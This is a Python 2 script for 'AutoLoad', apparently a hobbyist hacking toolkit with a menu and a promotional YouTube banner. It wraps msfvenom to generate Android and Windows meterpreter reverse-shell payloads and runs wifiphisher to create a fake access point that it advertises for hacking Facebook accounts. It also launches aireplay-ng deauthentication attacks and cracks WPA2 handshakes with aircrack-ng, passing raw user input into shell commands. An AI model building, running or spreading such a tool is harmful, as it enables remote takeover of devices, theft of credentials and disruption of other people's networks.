#!/usr/bin/env python
from __future__ import print_function
from __future__ import absolute_import
import colorama
from colorama import Fore
import os
import sys
import pygeoip
import requests
import httplib
import socket
import loading
managed=open('/usr/share/managed.txt').read()
monitor=open('/usr/share/monitor.txt').read()
helpi=open('/usr/share/help.txt').read()
os.system('resize -s 19 92')
os.system('clear')
print(Fore.GREEN +"                        Welcome to                   |::::::Follow Me on::::::")
print(Fore.GREEN +"         _         _        _     ___            _   |"+Fore.RED +"::::::::YouTube:::::::::") 
print(Fore.GREEN +"        / \  _   _| |_ ___ | |   / _ \  __ _  __| |  |"+Fore.WHITE+"https://www.youtube.com/Majorhacker")
print(Fore.GREEN +"       / _ \| | | | __/ _ \| |  | | | |/ _` |/ _` |  |"+Fore.YELLOW +"::::::::Website:::::::::")
print(Fore.GREEN +"      / ___ \ |_| | || (_) | |__| |_| | (_| | (_| |  |"+Fore.WHITE +"http://majorhacke.blogspot.com/")
print(Fore.GREEN +"     /_/   \_\__,_|\__\___/|_____\___/ \__,_|\__,_|  |"+Fore.BLUE +"::::::::Facebook::::::::")
print(Fore.GREEN +"                Automatic Your Proccess              |"+Fore.WHITE +"http://facebook.com/majorhacke ")
print(Fore.GREEN +"                       [created by Nafis] ["+Fore.WHITE +"V1.1"+Fore.GREEN +"]     |")
print(Fore.GREEN +"====================================================================================")
#------------------------------------------------------------------------------------------------------------------------------------------------------------
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def check_internet():
    test_con="www.google.com"
    test_res="/intl/en/policies/privacy/"
    test=httplib.HTTPConnection(test_con)
    try:
        test.request("GET",test_res)
        response=test.getresponse()
    except httplib.ResponseNotReady as e:
        print("Improper Connection State")
    except socket.gaierror as e:
        print("Not Connected to the Internet")
        print("Internet Required")
        user_input=raw_input("Press Any key to Go back...")
        import Autoload
    else:
        print(Fore.GREEN +"Connected")
        
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def payloads():
    def android():
        os.system('clear')
        print(Fore.GREEN +"[*]:::::: Payload Creator ::::::")
        print("")
        print("[]Create Payload For Android")
        print("")
        print("[*]Enter the IP and PORT you want to Listen on ")
        print("")
        ip=raw_input(Fore.BLUE +"[IP:] > ")
        port=raw_input("[PORT:] > ")
        name=raw_input("[Name of the File:] > ")
        path=raw_input("File Save to[add '/' in the end]: ")
        print("Payload is going to Saved in " +path+name+ ".apk")
        print("[]Generating...........")
        os.system('msfvenom -p android/meterpreter/reverse_tcp --platform android LHOST=' +ip+ ' LPORT=' +port+ ' -o'+path+name+ '.apk')
        print("")
        print("Done..")
        os.system('clear')
        import Autoload
        
    def windows():
        os.system('clear')
        print(Fore.GREEN +"[*]:::::: Payload Creator ::::::")
        print("")
        print("[]Create Payload For Windows")
        print("")
        print("[*]Enter the IP and PORT you want to Listen on ")
        print("")
        ip=raw_input(Fore.BLUE +"[IP:] > ")
        port=raw_input("[PORT:] > ")
        name=raw_input("[Name of the File:] > ")
        path=raw_input("File Save to[add '/' in the end]: ")
        print("Payload is going to Saved in " +path+name+ ".exe")
        print("[]Generating...........")
        os.system('msfvenom -p windows/meterpreter/reverse_tcp --platform windows LHOST=' +ip+ ' LPORT=' +port+ ' -o' +path+name+'.exe')
        print("")
        print("Done..")
        os.system('clear')
        import Autoload
    def user_inputpay():
        print(Fore.GREEN +"[*]:::::: Payload Creator ::::::")
        print("")
        print(Fore.BLUE +"1.) Create a Android payload")
        print("2.) Create a Windows payload")
        print("3.) Back")
        print("4.) Exit")
        print("")
        while True:
            userpay=input(Fore.BLUE +"[autoload:] > ")
            if userpay == 1:
                android()
            elif userpay == 2:
                windows()
            elif userpay == 3:
                import Autoload
            elif userpay == 4:
                print("")
                print(Fore.GREEN +"Thanks For Using AutoLoad")
                sys.exit()
            else:
                print(Fore.RED +"Wrong Choice")
    os.system('clear')
    user_inputpay()
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def helppp():
    os.system('clear')
    print("")
    print(Fore.GREEN +"[..Example..]")
    print("")
    print(Fore.BLUE +"IP: 192.168.43.1")
    print("PORT: 4444")
    print("Name of the File: payload")
    print("File Save to[add '/' in the end]: /root/payload/")
    print("")
    user_input=raw_input("Press Any key to Go back...")
    os.system('clear')
    import Autoload
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def fakeap():
    os.system('clear')
    print(Fore.GREEN +"[*]::::::Create a Fake AP to Hack Facebook Account::::::")
    print("")
    ap=raw_input(Fore.BLUE +"[Enter the name of the AP:] > ")
    print("[]Creating............")
    os.system('xterm -geometry 60x15+0+999999 -e wifiphisher  --essid ' +ap+ ' -p oauth-login')
    print("Done..")
    os.system('clear')
    import Autoload
#-------------------------------------------------------------------------------------------------------------------------------------------------------------
def deauth():
    def single():
        os.system('clear')
        print("")
        print(Fore.GREEN +"[*] Disconnect Single Client[Effective/Recommanded]")
        print("")
        print("[Just copy and paste the essid]")
        print("")
        apmac=raw_input(Fore.BLUE +"[Enter the AP Essid(MAC):] > ")
        print("")
        cmac=raw_input("[Enter the Client's MAC:] > ")
        print("")
        packet=raw_input("[packets to send:] > ")
        os.system('xterm -geometry 60x15+0+999999 -e aireplay-ng --deauth '+packet+ ' -a ' +apmac+ ' -c ' +cmac +' '+ monitor)
        os.system('clear')
        user_input()
    def allcl():
        os.system('clear')
        print("")
        print(Fore.GREEN +"[*] Disconnect All Client[Less Effective")
        print("")
        print("[Just copy and paste the essid]")
        print("")
        apmac=raw_input(Fore.BLUE +"[Enter the AP Essid(MAC):] > ")
        print("")
        packets=raw_input("[packets to send:] > ")
        os.system('xterm -geometry 60x15+0+999999 -e aireplay-ng --deauth '+packets+ ' -a ' +apmac+' '+ monitor)
        os.system('clear')
        user_input()
    def user_input():
        print(Fore.GREEN +"[*]:::::: Disconnect Client From there AP ::::::")
        print("")
        print(Fore.BLUE +"1.) Disconnect Single Client[Effective/Recommanded]")
        print("2.) Disconnect All Client[Less Effective]")
        print("3.) Scan ")
        print("4.) Enable Moniter Mode")
        print("5.) Disable Moniter Mode")
        print("6.) Back")
        print("7.) Exit")
        print("")
        while True:
            userif=input(Fore.BLUE +"[autoload:] > ")
            if userif == 1:
                single()
            elif userif == 2:
                allcl()
            elif userif == 3:
                os.system('clear')
                os.system('gnome-terminal --window  -- airodump-ng '+monitor)
                deauth()
            elif userif == 4:
                os.system('airmon-ng start '+managed)
                print("Done..")
                deauth()
            elif userif == 5:
                os.system('airmon-ng stop '+monitor)
                print("Done..")
                deauth()
            elif userif == 6:
                os.system('clear')
                import Autoload
            elif userif == 7:
                print("")
                print("Thanks For Using AutoLoad")
                sys.exit()
            else:
                print("Wrong Choice")
    os.system('clear')
    user_input()
#------------------------------------------------------------------------------------------------------------------------------------------------------------ 
def check_ip():
    os.system('clear')
    check_internet()
    print("[]Please wait....")
    print("Your Public IP is: ")
    public_ip=os.system('curl -s ipinfo.io/ip')
    print("")
    user_input=raw_input("Press Any key to Go back...")
    import Autoload
#------------------------------------------------------------------------------------------------------------------------------------------------------------
def brute_force():
    os.system('clear')
    print("[*]::::::Cracking Wpa2 Handshake File using Dictinoary Attack::::::")
    print("")
    handsak=raw_input("[Select HandShake File:] > ")
    print("")
    wordlist=raw_input("[Select WordList File:] > ")
    os.system('clear')
    print("[*]Cracking...........")
    os.system('aircrack-ng ' + handsak+ ' -w ' + wordlist)
    print("")
    userif = ''
    while not(userif == 'B' or userif == 'E'):
        userif=raw_input("[Type [b] Back or [e] Exit:] > ").upper()
        if userif == 'B':
            import Autoload
        elif userif == 'E':
            print("")
            print("Thanks For Using AutoLoad")
            sys.exit()
        else:
            print(Fore.RED +"Try Again")
        
    
    
#------------------------------------------------------------------------------------------------------------------------------------------------------------        
print("")
print("|1.)"+Fore.WHITE +" Create Payload         "+Fore.GREEN +"|5.)"+Fore.WHITE +" GeoLocate an IP "+Fore.GREEN +     "    |11.)"+Fore.WHITE +" Help")
print(Fore.GREEN +"|2.)"+Fore.WHITE +"                    "+Fore.GREEN +"|6.)"+Fore.WHITE +" View Public IP  "+Fore.GREEN + "    |22.)"+Fore.WHITE +" Update")
print(Fore.GREEN +"|3.)"+Fore.WHITE +" Create Fake AP         "+Fore.GREEN +"|7.)"+Fore.WHITE +" Crack Wpa2 HandShake"+Fore.GREEN +"|33.)"+Fore.WHITE +" Exit  ")
print(Fore.GREEN +"|4.)"+Fore.WHITE +" Deauth Attack          "+Fore.GREEN +"|                    "+Fore.GREEN +"    |      ")
print("")
while True:
    try:
        user=input(Fore.BLUE +"[autoload] > ")
        if user == 1:
            payloads()
        elif user == 2:
            pass
        elif user == 11:
            print (helpi)
        elif user == 33:
            print("")
            print(Fore.GREEN +"Thanks for using AutoLOad")
            print("Goodbye!!")
            print(Fore.RED +"Don't Forget to Subscribe my YouTube Channel..")
            print("")
            sys.exit()
        elif user == 3:
            fakeap()
        elif user == 4:
            deauth()
        elif user == 5:
            check_internet()
            os.system('clear')
            print("[*]::::::GeoLocate An IP Address::::::")
            print("")
            os.system('bash /usr/share/geoip.sh')
            import Autoload
        elif user == 6:
            check_ip()
        elif user == 7:
            brute_force()
        elif user == 22:
            check_internet()
            os.system('python /usr/share/updater.py')
        elif user == 'clear':
            os.system('clear')
        else:
            print(Fore.RED +"Wrong Choice")
        continue
    except KeyboardInterrupt:
        print("")
        print(Fore.GREEN +"Thanks For Using AutoLoad!")
        sys.exit()




    
                                              
